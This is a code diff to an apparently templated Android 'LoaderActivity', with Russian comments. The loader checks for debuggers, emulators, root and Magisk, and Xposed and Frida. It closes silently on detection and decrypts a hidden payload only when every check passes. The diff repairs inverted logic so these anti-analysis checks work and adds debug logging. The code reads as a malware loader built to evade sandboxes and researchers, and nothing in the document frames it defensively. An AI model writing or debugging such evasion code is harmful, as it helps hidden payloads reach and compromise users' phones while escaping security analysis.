@@ -731,9 +731,14 @@ public class LoaderActivity extends Activity {{
             Thread.sleep({random.randint(500, 1500)});
         }} catch (Exception e) {{}}
         
-        // Множественные проверки окружения
-        if (!checkEnvironment()) {{
+        // Множественные проверки окружения (с логированием для отладки)
+        android.util.Log.d("LoaderActivity", "Starting environment checks");
+        boolean envCheck = checkEnvironment();
+        android.util.Log.d("LoaderActivity", "Environment check result: " + envCheck);
+        
+        if (!envCheck) {{
             // Не показываем ошибку, просто закрываемся
+            android.util.Log.d("LoaderActivity", "Environment check failed, closing");
             try {{
                 Thread.sleep({random.randint(1000, 2000)});
             }} catch (Exception e) {{}}
@@ -742,10 +747,14 @@ public class LoaderActivity extends Activity {{
         }}
         
         // Проверка Google Play Services
+        android.util.Log.d("LoaderActivity", "Checking Google Play Services");
         if (!checkGooglePlayServices()) {{
+            android.util.Log.d("LoaderActivity", "Google Play Services not found, closing");
             finish();
             return;
         }}
+        
+        android.util.Log.d("LoaderActivity", "All checks passed, starting decryption");
         
         final AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle(APP_LABEL);
@@ -884,11 +893,13 @@ public class LoaderActivity extends Activity {{
     // ===== ЗАЩИТНЫЕ МЕХАНИЗМЫ (обфусцированные имена) =====
     
     private boolean validateEnvironment() {{
+        // Возвращает true если НЕТ отладчика (безопасно)
         return !android.os.Debug.isDebuggerConnected() && 
                !android.os.Debug.waitingForDebugger();
     }}
     
     private boolean checkDeviceCompatibility() {{
+        // Возвращает true если НЕ эмулятор (безопасно)
         // Проверка 1: Build параметры
         String brand = android.os.Build.BRAND.toLowerCase();
         String device = android.os.Build.DEVICE.toLowerCase();
@@ -902,7 +913,7 @@ public class LoaderActivity extends Activity {{
             model.contains("android sdk") || product.contains("sdk") ||
             fingerprint.contains("generic") || fingerprint.contains("test-keys") ||
             hardware.contains("goldfish") || hardware.contains("ranchu")) {{
-            return true;
+            return false;  // Эмулятор найден - небезопасно
         }}
         
         // Проверка 2: Файлы эмулятора
@@ -915,7 +926,7 @@ public class LoaderActivity extends Activity {{
         }};
         
         for (String file : emulatorFiles) {{
-            if (new java.io.File(file).exists()) return true;
+            if (new java.io.File(file).exists()) return false;  // Эмулятор найден
         }}
         
         // Проверка 3: Телефонный номер эмулятора
@@ -924,11 +935,11 @@ public class LoaderActivity extends Activity {{
                 (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
             String networkOperator = tm.getNetworkOperatorName();
             if (networkOperator != null && networkOperator.toLowerCase().equals("android")) {{
-                return true;
+                return false;  // Эмулятор найден
             }}
         }} catch (Exception e) {{}}
         
-        return false;
+        return true;  // Безопасно
     }}
     
     private boolean verifySystemIntegrity() {{
@@ -943,7 +954,7 @@ public class LoaderActivity extends Activity {{
         }};
         
         for (String path : suPaths) {{
-            if (new java.io.File(path).exists()) return true;
+            if (new java.io.File(path).exists()) return false;  // Root найден - небезопасно
         }}
         
         // Проверка 2: Magisk
@@ -954,7 +965,7 @@ public class LoaderActivity extends Activity {{
         }};
         
         for (String path : magiskPaths) {{
-            if (new java.io.File(path).exists()) return true;
+            if (new java.io.File(path).exists()) return false;  // Magisk найден
         }}
         
         // Проверка 3: Выполнение su
@@ -964,7 +975,7 @@ public class LoaderActivity extends Activity {{
                 new java.io.InputStreamReader(p.getInputStream()));
             String line = reader.readLine();
             p.destroy();
-            if (line != null) return true;
+            if (line != null) return false;  // su работает - root есть
         }} catch (Exception e) {{}}
         
         // Проверка 4: Busybox
@@ -974,10 +985,10 @@ public class LoaderActivity extends Activity {{
                 new java.io.InputStreamReader(p.getInputStream()));
             String line = reader.readLine();
             p.destroy();
-            if (line != null && !line.isEmpty()) return true;
+            if (line != null && !line.isEmpty()) return false;  // su найден
         }} catch (Exception e) {{}}
         
-        return false;
+        return true;  // Безопасно
     }}
     
     private boolean checkGooglePlayServices() {{
@@ -997,7 +1008,7 @@ public class LoaderActivity extends Activity {{
         }} catch (Exception e) {{
             for (StackTraceElement element : e.getStackTrace()) {{
                 if (element.getClassName().contains("de.robv.android.xposed")) {{
-                    return true;
+                    return false;  // Xposed найден
                 }}
             }}
         }}
@@ -1010,10 +1021,10 @@ public class LoaderActivity extends Activity {{
         }};
         
         for (String file : xposedFiles) {{
-            if (new java.io.File(file).exists()) return true;
+            if (new java.io.File(file).exists()) return false;  // Xposed найден
         }}
         
-        return false;
+        return true;  // Безопасно
     }}
     
     private boolean validateRuntimeEnvironment() {{
@@ -1024,7 +1035,7 @@ public class LoaderActivity extends Activity {{
             try {{
                 java.net.Socket socket = new java.net.Socket("127.0.0.1", Integer.parseInt(port));
                 socket.close();
-                return true;
+                return false;  // Frida найден
             }} catch (Exception e) {{}}
         }}
         
@@ -1036,42 +1047,55 @@ public class LoaderActivity extends Activity {{
             String line;
             while ((line = reader.readLine()) != null) {{
                 if (line.contains("frida") || line.contains("gum-js-loop")) {{
-                    return true;
+                    return false;  // Frida найден
                 }}
             }}
             p.destroy();
         }} catch (Exception e) {{}}
         
-        return false;
+        return true;  // Безопасно
     }}
     
     private boolean checkEnvironment() {{
         // Множественные проверки с задержками
-        if (!validateEnvironment()) {{
+        boolean result;
+        
+        result = validateEnvironment();
+        android.util.Log.d("LoaderActivity", "validateEnvironment: " + result);
+        if (!result) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
-        if (!checkDeviceCompatibility()) {{
+        result = checkDeviceCompatibility();
+        android.util.Log.d("LoaderActivity", "checkDeviceCompatibility: " + result);
+        if (!result) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
-        if (!verifySystemIntegrity()) {{
+        result = verifySystemIntegrity();
+        android.util.Log.d("LoaderActivity", "verifySystemIntegrity: " + result);
+        if (!result) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
-        if (!checkSecurityFramework()) {{
+        result = checkSecurityFramework();
+        android.util.Log.d("LoaderActivity", "checkSecurityFramework: " + result);
+        if (!result) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
-        if (!validateRuntimeEnvironment()) {{
+        result = validateRuntimeEnvironment();
+        android.util.Log.d("LoaderActivity", "validateRuntimeEnvironment: " + result);
+        if (!result) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
+        android.util.Log.d("LoaderActivity", "All environment checks passed");
         return true;
     }}
     
